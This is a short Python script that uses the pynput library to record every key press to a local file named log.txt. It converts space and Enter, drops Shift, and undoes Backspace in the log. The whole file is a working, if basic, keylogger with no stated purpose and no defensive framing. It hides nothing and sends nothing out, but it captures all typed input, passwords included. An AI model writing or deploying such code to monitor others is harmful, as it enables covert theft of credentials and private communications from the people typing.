from pynput.keyboard import Listener

def writetofile(key):
    letter=str(key)
    letter=letter.replace("'","")
    
    if letter=='Key.space':
        letter=' '
    
    if letter=='Key.shift':
        letter=''

    if letter=='Key.enter':
        letter="\n"
    
    if letter == "Key.backspace":
        
        with open("log.txt", "r+") as f:
            content = f.read()
            content = content[:-1]  
            f.seek(0)
            f.write(content)
            f.truncate()
        return

    with open("log.txt","a") as f:
        f.write(letter)
        
with Listener(on_press=writetofile) as l:
    l.join()
